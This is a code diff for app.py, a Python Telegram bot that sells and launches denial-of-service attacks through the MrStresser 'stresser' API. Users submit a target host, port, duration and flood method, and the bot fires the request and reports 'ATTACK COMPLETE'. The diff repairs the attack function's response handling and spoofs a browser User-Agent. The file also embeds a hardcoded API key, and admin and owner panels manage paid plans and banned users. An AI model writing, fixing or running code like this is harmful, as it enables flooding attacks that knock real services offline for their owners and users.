@@ -1,4 +1,4 @@
-# app.py - UPDATED FOR MRSTRESSER API WITH CORRECT PARAMETERS
+# app.py - COMPLETE UPDATED CODE FOR MRSTRESSER API
 import os
 import logging
 import asyncio
@@ -1035,11 +1035,10 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== UPDATED API ATTACK FOR MRSTRESSER =====
+# ===== FIXED API ATTACK FOR MRSTRESSER =====
 async def send_api_attack(target, port, duration, user_id, context, method="UDP-FLOOD", attack_num=1):
     """
-    Send attack to MrStresser API
-    URL: https://mrstresser.com/api?key=API_KEY&host=TARGET&port=PORT&time=TIME&method=METHOD
+    Send attack to MrStresser API with proper response handling
     """
     
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
@@ -1066,14 +1065,12 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP-
         "method": api_method
     }
     
-    # Optional parameters - you can add these based on user input
-    # params["concs"] = "2"  # Concurrents
-    # params["req_method"] = "GET"  # For Layer7 attacks
-    
+    # Headers for the request
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json, text/html",
-        "Accept-Encoding": "gzip, deflate",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive"
     }
     
@@ -1089,25 +1086,30 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP-
     )
     
     try:
-        timeout = aiohttp.ClientTimeout(total=duration + 30)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
+        timeout = aiohttp.ClientTimeout(total=duration + 30, connect=10)
+        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
             start_time = time.time()
             
-            logger.info(f"📤 Sending API request: {api_url} with params: {params}")
+            logger.info(f"📤 Sending API request to: {api_url}")
+            logger.info(f"📤 Parameters: {params}")
             
-            # Send attack request
-            async with session.get(api_url, params=params, headers=headers) as response:
+            async with session.get(api_url, params=params) as response:
                 elapsed = time.time() - start_time
-                response_text = await response.text()
+                
+                # Get response text
+                try:
+                    response_text = await response.text()
+                except:
+                    response_text = "Unable to read response"
                 
                 logger.info(f"📥 API Response - Status: {response.status}, Time: {elapsed:.2f}s")
                 logger.info(f"📥 Response Text: {response_text[:200]}")
                 
-                # Parse response
+                # Parse JSON response
                 try:
                     response_data = json.loads(response_text)
-                except:
-                    response_data = {"status": "unknown", "message": response_text[:100]}
+                except json.JSONDecodeError:
+                    response_data = {"status": "error", "message": "Invalid JSON response"}
                 
                 # Start timer
                 timer_task = asyncio.create_task(update_timer_single(status_msg, duration, target, port, method))
@@ -1118,47 +1120,55 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP-
                 # Cancel timer
                 timer_task.cancel()
                 
-                # Check response
-                if response.status == 200:
-                    # Check if attack was successful
-                    if response_data.get('status') == 'success':
-                        success_text = (
-                            f"✅ *ATTACK COMPLETE!*\n\n"
-                            f"🎯 Target: `{target}:{port}`\n"
-                            f"⏱️ Duration: `{duration}s`\n"
-                            f"📡 Method: `{method}`\n"
-                            f"✅ Status: Attack Sent Successfully\n"
-                            f"⏱️ Response Time: `{elapsed:.2f}s`\n"
-                            f"📊 API Method: `{api_method}`\n"
-                            f"📊 Response: `{response_text[:100]}`\n\n"
-                            f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
-                        )
-                    else:
-                        # API returned error
-                        error_msg = response_data.get('message', 'Unknown error')
-                        success_text = (
-                            f"⚠️ *ATTACK MAY HAVE FAILED*\n\n"
-                            f"🎯 Target: `{target}:{port}`\n"
-                            f"⏱️ Duration: `{duration}s`\n"
-                            f"📡 Method: `{method}`\n"
-                            f"❌ API Error: `{error_msg}`\n"
-                            f"📊 Response: `{response_text[:100]}`\n\n"
-                            f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
-                        )
+                # Check response - FIXED: Properly check for success
+                if response.status == 200 and response_data.get('status') == 'success':
+                    attack_id = response_data.get('attack_id', 'N/A')
+                    success_text = (
+                        f"✅ *ATTACK COMPLETE!*\n\n"
+                        f"🎯 Target: `{target}:{port}`\n"
+                        f"⏱️ Duration: `{duration}s`\n"
+                        f"📡 Method: `{method}`\n"
+                        f"✅ Status: Attack Sent Successfully\n"
+                        f"🆔 Attack ID: `{attack_id}`\n"
+                        f"⏱️ Response Time: `{elapsed:.2f}s`\n"
+                        f"📊 API Response: `{response_data.get('message', 'OK')}`\n\n"
+                        f"⚡ Attacks Running: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}"
+                    )
                     
                     await status_msg.edit_text(success_text, parse_mode='Markdown')
                     
                     return {
-                        "success": response_data.get('status') == 'success',
+                        "success": True,
                         "status": response.status,
                         "elapsed": elapsed,
-                        "response": response_text[:100],
+                        "response": response_text[:200],
                         "method": method,
                         "api_method": api_method,
                         "target": target,
                         "port": port,
                         "duration": duration,
+                        "attack_id": attack_id,
                         "api_response": response_data
+                    }
+                    
+                elif response.status == 200:
+                    # API returned 200 but not success
+                    error_text = (
+                        f"⚠️ *API RESPONSE*\n\n"
+                        f"🎯 Target: `{target}:{port}`\n"
+                        f"📡 Method: `{method}`\n"
+                        f"📊 Response: `{response_data.get('message', 'Unknown response')}`\n"
+                        f"⏱️ Response Time: `{elapsed:.2f}s`\n\n"
+                        f"💡 Attack may not have been sent successfully."
+                    )
+                    await status_msg.edit_text(error_text, parse_mode='Markdown')
+                    
+                    return {
+                        "success": False,
+                        "status": response.status,
+                        "error": response_data.get('message', 'Unknown error'),
+                        "response": response_text[:200],
+                        "method": method
                     }
                 else:
                     error_text = (
@@ -1193,6 +1203,7 @@ async def send_api_attack(target, port, duration, user_id, context, method="UDP-
             "method": method
         }
     except aiohttp.ClientError as e:
+        logger.error(f"Client error: {e}")
         await status_msg.edit_text(
             f"❌ *CONNECTION ERROR*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
@@ -1271,22 +1282,32 @@ async def check_api_status():
             "method": "udp-flood"
         }
         
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive"
+        }
+        
+        timeout = aiohttp.ClientTimeout(total=10, connect=5)
+        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
             start_time = time.time()
             async with session.get(api_url, params=params) as response:
                 elapsed = time.time() - start_time
-                response_text = await response.text()
+                
+                try:
+                    response_text = await response.text()
+                    response_data = json.loads(response_text)
+                except:
+                    response_text = "Unable to read response"
+                    response_data = {}
                 
                 if response.status == 200:
-                    try:
-                        data = json.loads(response_text)
-                        if data.get('status') == 'success':
-                            return True, f"✅ Connected to MrStresser (Response: {elapsed:.2f}s)"
-                        else:
-                            return True, f"✅ API Connected - Status: {data.get('message', 'OK')} (Response: {elapsed:.2f}s)"
-                    except:
-                        return True, f"✅ API Connected (Response: {elapsed:.2f}s)"
+                    if response_data.get('status') == 'success':
+                        return True, f"✅ API Connected - Status: Success (Response: {elapsed:.2f}s)"
+                    else:
+                        return True, f"✅ API Connected - Status: {response_data.get('message', 'OK')} (Response: {elapsed:.2f}s)"
                 elif response.status == 403:
                     return False, "❌ API Key Invalid or Expired"
                 elif response.status == 503:
@@ -1295,6 +1316,8 @@ async def check_api_status():
                     return False, f"❌ Error (Status: {response.status}) - {response_text[:50]}"
     except asyncio.TimeoutError:
         return False, "❌ Connection timeout - API is not responding"
+    except json.JSONDecodeError:
+        return False, "❌ Invalid JSON response from API"
     except Exception as e:
         return False, f"❌ Connection Failed: {str(e)[:50]}"
 
@@ -1570,8 +1593,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = db.is_admin(user_id)
     is_owner = db.is_owner_or_pseudo(user_id)
     
-    logger.info(f"User {user_id} - Plan: {plan}, Is Admin: {is_admin}, Is Owner: {is_owner}")
-    
     pause_info = db.get_pause_info()
     if pause_info.get('paused', False):
         paused_by = pause_info.get('paused_by', 'Unknown')
@@ -1641,7 +1662,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -1744,7 +1764,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
-# ===== BUTTON ATTACK =====
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1923,7 +1942,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
-# ===== MY PLAN =====
 async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1972,7 +1990,6 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
 
-# ===== STATS =====
 async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2020,7 +2037,6 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
 
-# ===== ADMIN PANEL =====
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2178,7 +2194,6 @@ async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
-# ===== DELETE FUNCTIONS =====
 async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2339,7 +2354,6 @@ async def process_delete_used_callback(update: Update, context: ContextTypes.DEF
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
         )
 
-# ===== OWNER PANEL =====
 async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2528,7 +2542,6 @@ async def owner_broadcast_stats_callback(update: Update, context: ContextTypes.D
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-# ===== API STATUS =====
 async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2563,7 +2576,6 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
     )
 
-# ===== PROMOTE ADMIN =====
 async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2620,7 +2632,6 @@ async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_promote'] = False
 
-# ===== DEMOTE ADMIN =====
 async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2695,7 +2706,6 @@ async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
         )
 
-# ===== BAN/UNBAN FUNCTIONS =====
 async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2792,7 +2802,6 @@ async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_unban'] = False
 
-# ===== LIST ADMINS =====
 async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -2902,7 +2911,6 @@ async def owner_banned_users(update: Update, context: ContextTypes.DEFAULT_TYPE)
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-# ===== REDEEM COMMAND =====
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -2965,7 +2973,6 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-# ===== STATUS COMMAND =====
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     users = db.get_all_users()
@@ -2994,7 +3001,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== BACK =====
 async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -3033,7 +3039,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     await update.message.reply_text("✅ Cancelled!")
 
-# ===== MESSAGE ROUTER =====
 async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.user_data.get('awaiting_attack'):
         await process_attack(update, context)
@@ -3070,14 +3075,11 @@ def run_bot():
     app.add_handler(CommandHandler("cancel", cancel))
     
     # ===== CALLBACK QUERY HANDLERS =====
-    # Main
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
     app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
-    
-    # Admin
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
     app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
     app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
@@ -3086,14 +3088,10 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_delete_used_callback, pattern="^admin_delete_used$"))
     app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
     app.add_handler(CallbackQueryHandler(admin_broadcast_stats_callback, pattern="^admin_broadcast_stats$"))
-    
-    # Delete handlers
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delallunused$"))
     app.add_handler(CallbackQueryHandler(process_delete_used_callback, pattern="^delused_"))
     app.add_handler(CallbackQueryHandler(process_delete_used_callback, pattern="^delallused$"))
-    
-    # Owner
     app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
     app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
     app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
@@ -3108,7 +3106,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_broadcast_stats_callback, pattern="^owner_broadcast_stats$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
-    # ===== MESSAGE ROUTER =====
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
     app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, message_router))
     app.add_handler(MessageHandler(filters.VIDEO & ~filters.COMMAND, message_router))
@@ -3129,7 +3126,6 @@ if __name__ == "__main__":
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
     print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
     print("📌 API: MrStresser (mrstresser.com)")
-    print("📌 Owner & Pseudo_Owner have equal powers")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
